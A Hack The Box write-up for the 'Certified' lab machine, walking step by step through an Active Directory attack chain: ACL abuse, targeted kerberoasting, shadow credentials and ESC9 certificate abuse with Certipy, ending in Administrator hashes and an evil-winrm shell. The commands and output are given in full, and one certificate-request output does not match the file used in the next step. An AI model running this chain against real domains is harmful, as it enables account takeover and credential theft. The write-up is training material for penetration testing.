---
title: "Certified"
date: 29-05-2025
categories: [HTB, Windows, Windows Medium]
tags: [AD, Certipy, GenericWrite , Bloodhound, ACL,ESC9, Medium]
image: https://labs.hackthebox.com/storage/avatars/28b71ec11bb839b5b58bdfc555006816.png
---

Certified is a medium difficulty box. This is an assumed breach scenario, therefore, we start with some credentials for the judith user. This user has the WriteOwner ACL over the management group, we can leverage this ACL to add the judith user to this group which has GenericWrite to the management_svc user letting us extract its NTLM hash via a shadow credential attack. This user is able to PSRemote to the DC which gets us the user flag. management_svc has GenericAll over the ca_operator user which can exploit the ESC9 vulnerability which we can then use to get the Administrators NTLM hash. 

![puppy_info_card](/assets/images/certified/Certified.png)

## Enumeration
As always, we can start enumerating the box with an nmap scan. We can see that we are dealing with an active directory machine due to port 88 being open. Other than that, the nmap scan does not reveal anything interesting. Things to look out for would be a MSSQL database being open or a website on port 80, since it only has default ports open we can move on to SMB.


#### Nmap
```
# Nmap 7.94SVN scan initiated Thu May 29 15:07:57 2025 as: nmap -p- --min-rate 5000 -Pn -n -oN nmap/allports 10.10.11.41
Nmap scan report for 10.10.11.41
Host is up (0.023s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

#### SMB
We can enumerate the available smb shares with netexec which shows the Windows Server version of the machine and the domain name. All of these are handy when it comes to using commands that require the domain name and knowing the windows server version helps when attempting privilege escalation exploits. 

```
netexec smb 10.10.11.41 -u judith.mader -p judith09 --shares
SMB  10.10.11.41     445    DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB  10.10.11.41     445    DC01  [+] certified.htb\judith.mader:judith09 
SMB  10.10.11.41     445    DC01  [*] Enumerated shares
SMB  10.10.11.41     445    DC01  Share           Permissions     Remark
SMB  10.10.11.41     445    DC01  -----           -----------     ------
SMB  10.10.11.41     445    DC01  ADMIN$                          Remote Admin
SMB  10.10.11.41     445    DC01  C$                              Default share
SMB  10.10.11.41     445    DC01  IPC$            READ            Remote IPC
SMB  10.10.11.41     445    DC01  NETLOGON        READ            Logon server share 
SMB  10.10.11.41     445    DC01  SYSVOL          READ            Logon server share 
```

The available shares are just the default ones and after scanning them with smbclient they all appear to be empty or do not contain any useful information.

#### BloodHound
Since nmap and smb did not get us anything useful we can try with a bloodhound scan to reveal which ACL's the judith user might have.

```
bloodhound-python -u 'judith.mader' -p 'judith09' -ns 10.10.11.41 -d certified.htb -c all 
```

After uploading the data to bloodhound as a zip file we can see that judith has a path to management_svc which can PSRemote to the domain controller. With the ability to land a powershell session into the DC comes the possibility of privilege escalation.

![certified](/assets/images/certified/judith.png)

## Taking Advantage of WriteOwner 
First we must change the group owner of the management group and assign us the ability to add members to this group, we can then add the judith user. To do so we can use the following set of commands:

```
owneredit.py  -action write -new-owner 'judith.mader' -target 'management' 'certfified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

Judith is now the new owner of this group, we can grant ourselves the AddMember privilege with the following command:

```
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250529-202124.bak
[*] DACL modified successfully!
```

Finally we can add judith to the group from which we can leverage the GenericWrite privilege over the management_svc user. 

```
net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.10.11.41"
```

## Using GenericWrite to perform a Shadow Credential Attack
With the GenericWrite privilege we can either perform a targeted kerberoast attack or add a shadow credential which we can use to get the NTLM hash of the user. I prefer doing the kerberoast attack as it is quite fast, if the hash cracks we get easy access with the cracked password, if it fails well, we did not waste that much time trying.

```
targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

We get an error saying that the server and our machine have a clock skew that is too large and the command fails. To fix this we can use the ntpdate command which steps our time to the server's. I like using `;` as it allows the second command to execute right after changing the time which is useful, as ntpdate only skip our time for a brief moment.

```
sudo ntpdate 10.10.11.41 ; python3 /home/madaf/HTB/labs/administrator/targetedKerberoast/targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'

2025-05-30 03:26:56.795230 (+0200) +25200.322813 +/- 0.007315 10.10.11.41 s1 no-leap
CLOCK: time stepped by 25200.322813
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (management_svc)
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$438a41d16f81a1d63ece594ca0babe97$6895594811531a7e3b3ea4b384f4bed7f74a202944587f23a64c056f3dd329e0cf93a1af67083a2b2da6bd0744703ecddf4304f451e768f9cc49e2fefd96b0d4b9a34ba3b7e7890f5d528c1fb33<SNIP>
```

We get the hash of management_svc user, we can use hashcat to try to crack the password. 

```
hashcat management_svc.hash /usr/share/wordlists/rockyou.txt -m 13100
<SNIP>
Session..........: hashcat                                
Status...........: Exhausted
<SNIP>
```

We are not able to crack the password but we can still perform the shadow credential attack. I found two ways to execute it one being much simpler than the other, but I will still show both methods.

#### PYWhisker method
We can use pywhisker to create a PFX file that we can use to authenticate as the management_svc user, we can install pywhikser by creating a python virtual environment and thne running `pip install pywhisker`, we can then use the following command to create the pfx file.

```
pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" --dc-ip 10.10.11.41
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: a4450c15-d229-f7dc-bd26-403598662816
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: 0wOsyyZc.pfx
[*] Must be used with password: gyii9GUBQp5oPVgnnIAy
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

The tool itself points us to PKINITtools which we can use to find the NTLM hash. To do so we must first clone the github repository. This repository uses an oscrypto version that break so we must also add a compatible version to the requirements.txt file.

```
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools
vim requirements.txt -> add the following in a new line: 
oscrypto @ git+https://github.com/wbond/oscrypto.git@d5f3437ed24257895ae1edd9e503cfb352e635a8

pip install -r requirements.txt
```

We can now use the python scripts inside PKINITtools, I also changed the pfx file name to something easier to read. Remember to use ntpdate to avoid the clock skew errors:

```
sudo ntpdate 10.10.11.41; python3 gettgtpkinit.py -cert-pfx management_svc.pfx -pfx-pass gyii9GUBQp5oPVgnnIAy certified.htb/management_svc management.ccache -dc-ip 10.10.11.41 -v
[sudo] password for madaf: 
2025-05-30 03:47:07.365895 (+0200) +25200.327198 +/- 0.008258 10.10.11.41 s1 no-leap
CLOCK: time stepped by 25200.327198
2025-05-30 03:47:07,510 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-05-30 03:47:07,522 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-05-30 03:47:11,672 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-05-30 03:47:11,673 minikerberos INFO     a2e812a9dab1dea0480dc7e75666beb554ad78b7f5b6ce31d5d1b3bcf218d303
INFO:minikerberos:a2e812a9dab1dea0480dc7e75666beb554ad78b7f5b6ce31d5d1b3bcf218d303
2025-05-30 03:47:11,677 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

This created the ccache file that we can use to authenticate with kerberos and the file key to use it. We can export the ccache file so its easier to use.

```
export KRB5CCNAME=management.ccache

klist
Ticket cache: FILE:management.ccache
Default principal: management_svc@CERTIFIED.HTB

Valid starting     Expires            Service principal
30-05-25 03:47:11  30-05-25 13:47:11  krbtgt/CERTIFIED.HTB@CERTIFIED.HTB
```

We can now get the NTLM hash of the management_svc user with this command:

```
sudo ntpdate 10.10.11.41 ; python3 getnthash.py certified.htb/management_svc -key a2e812a9dab1dea0480dc7e75666beb554ad78b7f5b6ce31d5d1b3bcf218d303
2025-05-30 03:48:25.711007 (+0200) +25200.329470 +/- 0.006982 10.10.11.41 s1 no-leap
CLOCK: time stepped by 25200.329470
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

Note that the key was provided to us whne we ran the gettgtpkinit.py script. 
#### Certipy method
The easier way to do this attack is with the following certipy command:
```
sudo ntpdate 10.10.11.41 ;certipy shadow auto -target certified.htb -username judith.mader@certified.htb -password judith09  -account management_svc -dc-ip 10.10.11.41
2025-05-30 04:03:31.17459 (+0200) +25200.328735 +/- 0.007778 10.10.11.41 s1 no-leap
CLOCK: time stepped by 25200.328735
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b95cca55-796c-46eb-779e-761b9af45ca0'
[*] Adding Key Credential with device ID 'b95cca55-796c-46eb-779e-761b9af45ca0' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID 'b95cca55-796c-46eb-779e-761b9af45ca0' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

We can then winrn into the box with the following command:

```
evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
                                        
Evil-WinRM shell v3.5
                                                          
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Desktop> cat user.txt
52acbdfa614a2480edfa86b878aca1b4
```

## Using GenericAll to get ca_operator's NTLM hash
Since we have access to the box we could try privilege escalation methods but after a quick look it seemed unlikely that this is the intended path, everything looks like a default configuration and there are no extra directories or running processes that could hint towards an exploit. Going back over the bloodhound data we can see that the user we just compromised, managemetn_svc, has GenericAll over the ca_operator user. We can change the password of this user but I just opted for a shadow credential attack, using the same certipy command as before I am able to get the NTLM has of this user.

![certified](/assets/images/certified/mana.png)

```
sudo ntpdate 10.10.11.41 ;certipy shadow auto -target certified.htb -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584  -account ca_operator -dc-ip 10.10.11.41
2025-05-30 04:11:50.746520 (+0200) +25200.329784 +/- 0.007767 10.10.11.41 s1 no-leap
CLOCK: time stepped by 25200.329784
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '4317a398-85e6-a509-24aa-89a2bd9c877f'
[*] Adding Key Credential with device ID '4317a398-85e6-a509-24aa-89a2bd9c877f' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '4317a398-85e6-a509-24aa-89a2bd9c877f' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

## Using ESC9 to get the Administrator´s NTLM hash
Now that we have the NTLM hash for the ca_operator user we could go on a bunch of different tangets to try to find a way to the Admin user but come on, lets be honest, the name of the box is Certified. We can run certipy on this account which shows that the DC is vulnearble to ESC9.

```
certipy find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -stdout -vuln
Certipy v5.0.2 - by Oliver Lyak (ly4k)
<SNIP>
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
<SNIP>
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
<SNIP>
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

I used [this page](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template) to guide me through the exploitation process. It is actually quite simple. First we must see that ca_operator can be enrolled into the vulnerable template, since we have the hash of this user its really easy to do. We can start off by changing the UPN to be the administrator's sAMAccountName which is usually Administrator.

```
certipy account -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -dc-ip '10.10.11.41' -upn 'administrator' -user 'ca_operator' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
```

Note that I used the management user to execute this command as I know this user has the GenericAll ACL for ca_opearator. We can then request the certificate as the ca_operator, which will instead point to the Administrator user. We must specify the CA name and the template that is vulnerable, all of this data was provided in the command we used above to check for vulnerabilities.

```
certipy req -u ca_operator -hashes b4b86f45c6018f1b664f70805f45d8f2 -dc-ip '10.10.11.41' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'ca_operator@certified.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'ca_operator.pfx'
[*] Wrote certificate and private key to 'ca_operator.pfx'
```

After this command we must change the upn of the user ca_operator to its orignal value so it does not conflict with the authentication.

```
certipy account     -u 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584'     -dc-ip '10.10.11.41' -upn 'ca_operator'     -user 'ca_operator' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator
[*] Successfully updated 'ca_operator
```

Finally we can use certipy with the auth option to use the pfx file we got to authenticate as the administrator user which gives us the NTLM hash and we are able to winrrm into the DC.

```
sudo ntpdate 10.10.11.41 ;certipy auth     -dc-ip '10.10.11.41' -pfx 'administrator.pfx'     -username 'administrator' -domain 'certified.htb'
2025-05-30 00:08:05.408072 (+0200) +25200.298343 +/- 0.008488 10.10.11.41 s1 no-leap
CLOCK: time stepped by 25200.298343
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

```
evil-winrm -i 10.10.11.41 -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
                                        
Evil-WinRM shell v3.5                                       
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
53c13fb5363a2375af547fee94e465a8
```
